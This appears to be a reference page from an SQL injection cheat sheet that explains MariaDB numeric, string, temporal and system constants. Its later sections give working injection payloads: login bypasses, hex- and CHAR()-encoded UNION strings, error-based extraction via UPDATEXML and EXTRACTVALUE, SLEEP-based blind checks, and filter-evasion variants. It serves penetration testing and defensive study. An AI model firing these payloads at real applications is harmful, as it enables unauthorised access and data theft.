---
title: Constants
description: MariaDB constants and literals useful in SQL injection
category: Reference
order: 22
tags: ["constants", "literals", "reference"]
lastUpdated: 2025-12-18
---

## Constants

MariaDB supports various types of constants (literals) that can be valuable in SQL injection attacks. Understanding these constants helps in crafting more effective payloads and bypassing certain filters.

### Numeric Constants

MariaDB supports several formats for numeric literals:

| Type                | Example         | Notes                  |
| ------------------- | --------------- | ---------------------- |
| Integer             | `1234`          | Regular integer        |
| Negative Integer    | `-123`          | Negative value         |
| Decimal             | `123.45`        | Decimal point notation |
| Scientific Notation | `1.23e2`        | Same as 123.0          |
| Hexadecimal         | `0xFF`          | Same as 255            |
| Binary              | `0b1111`        | Same as 15             |
| Boolean             | `true`, `false` | Same as 1 and 0        |

### String Constants

String literals can be represented in several ways:

| Type          | Example                    | Notes                                       |
| ------------- | -------------------------- | ------------------------------------------- |
| Single Quote  | `'text'`                   | Standard SQL string                         |
| Double Quote  | `"text"`                   | Valid if `ANSI_QUOTES` SQL mode is disabled |
| Hex String    | `0x74657874`               | Hexadecimal representation of 'text'        |
| CHAR()        | `CHAR(97,100,109,105,110)` | Builds 'admin' from ASCII codes             |
| Binary String | `_binary'text'`            | Binary string                               |

#### Building Strings with CHAR()

The CHAR() function converts integers to characters, useful for bypassing quote filters:

```sql
-- Build 'admin' from ASCII codes
SELECT CHAR(97, 100, 109, 105, 110) -- Returns: admin

-- Build arbitrary strings using CONCAT and CHAR
SELECT CONCAT(CHAR(116), CHAR(101), CHAR(115), CHAR(116)) -- Returns: test
```

### Temporal Constants

Date and time constants:

| Type      | Example                           | Notes                      |
| --------- | --------------------------------- | -------------------------- |
| Date      | `'2025-12-18'`                    | YYYY-MM-DD format          |
| Time      | `'15:30:45'`                      | HH:MM:SS format            |
| Datetime  | `'2025-12-18 15:30:45'`           | YYYY-MM-DD HH:MM:SS format |
| Timestamp | `TIMESTAMP '2025-12-18 15:30:45'` | ANSI SQL timestamp         |

### Special Constants

MariaDB has several special values:

| Constant            | Description                                                              |
| ------------------- | ------------------------------------------------------------------------ |
| `NULL`              | Represents a NULL value                                                  |
| `\N`                | NULL synonym in file I/O operations (LOAD DATA, SELECT ... INTO OUTFILE) |
| `CURRENT_USER()`    | Returns authenticated account as `user@host`                             |
| `DEFAULT`           | Used to specify default column value                                     |
| `CURRENT_TIMESTAMP` | Current date and time                                                    |
| `CURRENT_DATE`      | Current date                                                             |
| `CURRENT_TIME`      | Current time                                                             |

#### COALESCE Function

The COALESCE function returns the first non-NULL value in a list:

```sql
-- Returns first non-NULL value
SELECT COALESCE(NULL, 'default_value') -- Returns: default_value

-- Useful for error-based extraction with fallback
SELECT COALESCE(NULL, NULL, @@version) -- Returns: version string
```

### System Constants

Some important MariaDB system constants:

| Constant      | Description         | Example Value              |
| ------------- | ------------------- | -------------------------- |
| `@@version`   | MariaDB version     | `10.6.24-MariaDB`          |
| `@@datadir`   | Data directory      | `/var/lib/mysql/`          |
| `@@hostname`  | Server hostname     | `db-server`                |
| `@@server_id` | Server ID           | `1`                        |
| `@@basedir`   | Base directory      | `/usr/`                    |
| `@@tmpdir`    | Temporary directory | `/tmp`                     |
| `@@port`      | MariaDB port        | `3306`                     |
| `@@log_error` | Error log path      | `/var/log/mysql/error.log` |

### Boolean Expressions

Boolean expressions evaluate to 1 or 0:

| Expression         | Result    |
| ------------------ | --------- |
| `1=1`              | 1 (true)  |
| `1=0`              | 0 (false) |
| `NULL IS NULL`     | 1 (true)  |
| `NULL IS NOT NULL` | 0 (false) |
| `true AND true`    | 1 (true)  |
| `true AND false`   | 0 (false) |

### Using Constants in SQL Injection

#### String Constants in Bypasses

```sql
-- Standard string
' OR 'a'='a

-- Hex string bypass
' OR 0x613d61 -- (a=a in hex)

-- Mixed approach
' OR 0x61='a' -- (a='a')
```

#### Numeric Constants in Bypasses

```sql
-- Boolean as number
' OR true -- (same as 1)

-- Hex number
' OR 0x1 -- (same as 1)

-- Mathematical expression
' OR 4-3 -- (evaluates to 1)
```

#### Practical Applications

##### Using Boolean Constants

```sql
-- Simple authentication bypass
' OR 1 -- -
' OR true -- -
' OR 1=1 -- -
```

##### Using String Constants

```sql
-- Hex-encoded bypass
' UNION SELECT 0x61646D696E -- - (selects 'admin')

-- Bypassing quote filters with CHAR()
SELECT CHAR(97, 100, 109, 105, 110) -- 'admin'

-- Hex string in UNION injection
SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 0x696E6A6563746564
-- 0x696E6A6563746564 = 'injected'
```

##### Using System Constants

```sql
-- Information gathering
' UNION SELECT @@version, @@datadir -- -

-- Path disclosure
' UNION SELECT CONCAT(@@datadir,'/mysql/user.MYD') -- -
```

### Error-Based Injection with Constants

```sql
-- UPDATEXML error-based extraction
' AND UPDATEXML(1,CONCAT('~',@@version,'~'),1) -- -

-- EXTRACTVALUE error-based extraction
' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -

-- Causing type conversion errors
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

### Constants in Time-Based Attacks

```sql
-- Sleep only if condition is true
' AND IF(SUBSTR(@@version,1,1)='1',SLEEP(5),0) -- -

-- Using hex constants in time-based
' AND IF(SUBSTR(@@version,1,1)=0x31,SLEEP(5),0) -- - (checking for '1')
```

### Case Sensitivity

Boolean and NULL constants are case-insensitive, useful for bypassing case-sensitive filters:

```sql
-- All equivalent (case-insensitive)
SELECT TRUE, True, true   -- All return 1
SELECT FALSE, False, false -- All return 0
SELECT NULL, Null, null   -- All return NULL

-- Can be useful for bypassing case-sensitive filters
' OR TRUE -- -
' OR True -- -
' OR true -- -
```

### Limitations and Considerations

1. Hex string literals are MySQL/MariaDB-specific and may not work in other databases
2. Some constants like `true`/`false` are case-insensitive (can be used for filter bypass)
3. String constants are limited to available character encoding
4. Some system constants require specific privileges to access
5. Constants behavior can vary across MariaDB versions
